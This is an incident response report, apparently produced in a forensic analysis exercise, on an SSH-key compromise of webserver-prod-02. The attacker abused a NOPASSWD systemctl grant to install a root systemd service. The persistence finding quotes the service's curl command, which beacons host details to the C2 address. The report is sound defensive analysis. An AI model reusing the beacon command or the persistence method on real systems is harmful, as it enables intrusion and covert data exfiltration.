All 10 claims accepted. Here is the final report.

---

# Incident Response Report — webserver-prod-02

## Executive Summary

The host **webserver-prod-02** was compromised on **April 14, 2026 at 03:17 UTC** via the **deploy** service account. An attacker authenticated from the known C2 IP **185.229.59.103** using deploy's stolen SSH private key and exploited an overly permissive NOPASSWD sudo grant to install a persistent C2 beacon as a systemd service running as root. The attacker's on-host session lasted approximately 3 minutes (03:17:44 – 03:20:51).

## Timeline of Events

| Time (UTC) | Event | Source |
|---|---|---|
| Apr 13 08:15 – 16:44 | Normal operations by deploy, alice, bob — nginx restarts, log checks, apt upgrade | auth.log:3-29 |
| **Apr 14 03:17:44** | **deploy** logs in from **185.229.59.103** (C2 IP) via publickey | auth.log:30 |
| Apr 14 03:18:02 | Attacker runs `sudo cat /etc/passwd` (credential/config recon) | auth.log:32 |
| Apr 14 03:18:12 | Attacker copies `/tmp/update` → `/usr/local/bin/update` via sudo | auth.log:35 |
| Apr 14 03:18:17 | Attacker `chmod +x /usr/local/bin/update` | auth.log:36 |
| Apr 14 03:18:29 | Attacker writes `system-updater.service` via `sudo tee` | auth.log:37 |
| Apr 14 03:18:44 | `sudo systemctl daemon-reload` | auth.log:38 |
| Apr 14 03:18:58 | `sudo systemctl enable system-updater.service` — **persistence established** | auth.log:39 |
| Apr 14 03:19:03 | `sudo systemctl start system-updater.service` — **beacon active** | auth.log:40 |
| Apr 14 03:20:51 | Attacker's SSH session closed | auth.log:41 |
| Apr 14 08:25 – 10:04 | Normal deploy/bob logins resume from internal IPs | auth.log:44-50 |

## Findings

### 1. Initial Access — Stolen SSH Key (CONFIRMED)
The attacker authenticated as `deploy` from **185.229.59.103** using the same RSA key fingerprint (`SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ`) seen in all legitimate deploy logins from `10.0.1.50`. There was no brute force — the private key was obtained off-host. *(auth.log:30)*

### 2. C2 IP Confirmed Malicious (CONFIRMED)
Threat intelligence classifies **185.229.59.103** as a C2 server (tags: c2, beacon; confidence: high).

### 3. Privilege Escalation — NOPASSWD sudo (CONFIRMED)
The `deploy` account had `NOPASSWD: /usr/bin/systemctl` in `/etc/sudoers.d/deploy`. The bare systemctl grant (no argument restriction) allowed the attacker to install, enable, and start any systemd service as root without authentication. *(fs/etc/sudoers.d/deploy)*

### 4. Persistence — Malicious systemd Service (CONFIRMED)
The attacker created `/etc/systemd/system/system-updater.service`, which runs as root and executes:
```
/usr/bin/curl -sX POST https://185.229.59.103:8443/beacon -d "host=$(hostname)&ip=$(hostname -I)"
```
It restarts every 600 seconds and is enabled at boot (`WantedBy=multi-user.target`). *(fs/etc/systemd/system/system-updater.service)*

### 5. Malicious Binary Staged (CONFIRMED)
The attacker copied `/tmp/update` to `/usr/local/bin/update` and made it executable. The binary's purpose is unknown from available evidence; it was not referenced in the systemd unit. *(auth.log:35-36)*

### 6. Anti-Forensics — Missing Shell History (CONFIRMED)
The attacker's seven sudo commands (auth.log lines 32–40) do **not** appear in deploy's `.bash_history`. Deploy's history contains only 15 benign CI/CD commands. The attacker either cleared the history, used `HISTFILE=/dev/null`, or operated in a way that bypassed history recording. *(auth.log:32-40, fs/home/deploy/.bash_history)*

### 7. SSH Configuration
The sshd_config is hardened (key-only auth, no root login, MaxAuthTries 3). Deploy's `authorized_keys` contains two RSA keys: `deploy@ci-runner-1` and `deploy@ci-backup`. The compromise was not due to SSH misconfiguration but rather a stolen private key.

## Shell History Analysis

| Account | History File | Commands | Findings |
|---|---|---|---|
| **root** | `fs/root/.bash_history` | 4 | Clean: `apt update`, `apt upgrade`, `systemctl restart nginx`, `tail -f /var/log/nginx/error.log` |
| **deploy** | `fs/home/deploy/.bash_history` | 15 | Mostly CI/CD commands (git, npm, docker). One `curl -sS https://registry.npmjs.org/` flagged (legitimate). **No attacker commands present.** |
| **alice** | `fs/home/alice/.bash_history` | 6 | Clean: `ls`, `cd /var/log`, `tail nginx/access.log`, `journalctl`, `systemctl status nginx`, `exit` |
| **bob** | *(no .bash_history found)* | — | Account exists (uid 1003, /etc/passwd:25) but no history file on disk |

## Recommendations

1. **Immediate**: Disable and remove `system-updater.service`; remove `/usr/local/bin/update`
2. **Immediate**: Rotate all SSH keys for the `deploy` account; investigate how the private key was exfiltrated
3. **Immediate**: Block `185.229.59.103` at the network perimeter
4. **Short-term**: Restrict deploy's sudo grant to specific systemctl subcommands (e.g., `systemctl restart nginx` only), not bare systemctl
5. **Short-term**: Investigate the CI runner hosts (`ci-runner-1`, `ci-backup`) as the likely source of the key compromise
6. **Medium-term**: Implement host-based monitoring for new systemd unit creation and SSH logins from non-allowlisted IPs

---

## Case Questions

**Case Q1:** Shell histories were analyzed for three accounts: **root**, **deploy**, and **alice**. Bob's account exists in `/etc/passwd` (uid 1003) but had no `.bash_history` file on disk.

**Case Q2:** Yes — but the attacker's actions do **not** appear in any shell history file. They are visible only in the **auth.log sudo trail** (lines 32–40) under the **deploy** account. The auth.log shows that after logging in from the C2 IP 185.229.59.103 at 03:17:44, the attacker used deploy's NOPASSWD sudo to: (1) read `/etc/passwd`, (2) copy a binary from `/tmp/update` to `/usr/local/bin/update` and make it executable, (3) write and enable a malicious systemd service (`system-updater.service`) that beacons to the C2 server every 10 minutes. Deploy's `.bash_history` contains only benign CI/CD commands, indicating the attacker cleared history or suppressed its recording.